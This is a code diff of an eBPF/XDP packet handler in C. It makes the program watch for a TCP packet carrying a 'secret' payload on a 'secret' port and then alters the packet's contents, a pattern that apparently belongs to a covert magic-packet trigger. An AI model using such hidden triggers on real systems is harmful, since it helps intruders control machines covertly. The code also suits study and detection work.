@@ -14,6 +14,7 @@
 #include <linux/if_ether.h>
 #include <linux/ip.h>
 #include <linux/udp.h>
+#include <string.h>
 
 #include <linux/bpf.h>
 #include <bpf/bpf_helpers.h>
@@ -22,7 +23,10 @@
 
 #include "../user/xdp_filter.h"
 #include "../constants/constants.h"
-#include "../include/packet/packet_manager.h"
+
+#include "packet/packet_manager.h"
+#include "packet/protocol/tcp_helper.h"
+#include "common/common_utils.h"
 
 
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
@@ -56,10 +60,11 @@ int xdp_receive(struct xdp_md *ctx)
     
     void *data_end = (void *)(long)ctx->data_end;
     void *data = (void *)(long)ctx->data;
-    char match_pattern[] = "test";
-    unsigned int payload_size, i;
+    char match_pattern[] = SECRET_PACKET_PAYLOAD;
+    int match_pattern_size = strlen(match_pattern);
+    unsigned int payload_size;
     struct ethhdr *eth = data;
-    unsigned char *payload;
+    char *payload;
     struct tcphdr *tcp;
     struct iphdr *ip;
     
@@ -87,34 +92,32 @@ int xdp_receive(struct xdp_md *ctx)
         return XDP_PASS;
     }
 
-    if (tcp->dest != ntohs(9000)){
-        bpf_printk("E");
+    if (get_tcp_dest_port(tcp) != SECRET_PACKET_DEST_PORT){
+        bpf_printk("E %i\n", ntohs(tcp->dest));
         return XDP_PASS;
     }
 
     payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
     payload = (void *)tcp + tcp->doff*4;
 
-    // Here we use "size - 1" to account for the final '\0' in "test".
+    // We use "size - 1" to account for the final '\0'
     if (payload_size != sizeof(match_pattern) - 1) {
         bpf_printk("F");
         return XDP_PASS;
     }
 
     // Point to start of payload.
-    if ((void *)payload + payload_size > data_end){
+    if (tcp_payload_bound_check(payload, payload_size, data_end)){
         bpf_printk("G");
         return XDP_PASS;
     }
 
     bpf_printk("Received valid TCP packet with payload %s of size %i\n", payload, payload_size);
     // Compare each byte, exit if a difference is found.
-    for (i = 0; i < payload_size; i++)
-        if (payload[i] != match_pattern[i]){
-            bpf_printk("H");
-            return XDP_PASS;
-        }
-
+    if(str_n_compare(payload, payload_size, match_pattern, match_pattern_size, payload_size)!=0){
+        bpf_printk("H");
+        return XDP_PASS;
+    }
 
     bpf_printk("BPF finished\n ");
     payload[1] = 'b';
